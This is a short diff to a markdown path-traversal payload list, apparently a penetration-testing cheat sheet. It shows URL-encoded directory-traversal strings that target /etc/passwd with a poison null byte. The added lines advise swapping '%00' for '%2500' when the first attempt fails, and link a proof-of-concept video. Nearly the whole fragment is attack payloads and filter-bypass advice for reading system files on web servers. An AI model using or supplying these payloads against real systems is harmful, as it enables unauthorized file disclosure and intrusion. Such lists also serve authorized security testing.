@@ -47,6 +47,9 @@ ___
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
 %2e%2e%2f%2f%2e%2e%2f%2f%2e%2e%2f%2fetc%2e%2e%2fpasswd%00
 ```
+If not work, try with `%2500` instead of `%00`. <br>
+Poc: [Character bypass with Poison Null Byte](https://youtu.be/LSsjqnD0CYU?si=YuC-daGovlRzrlHX)
+
 ### Linux Path Traversal Payloads
 ```
 /etc/passwd
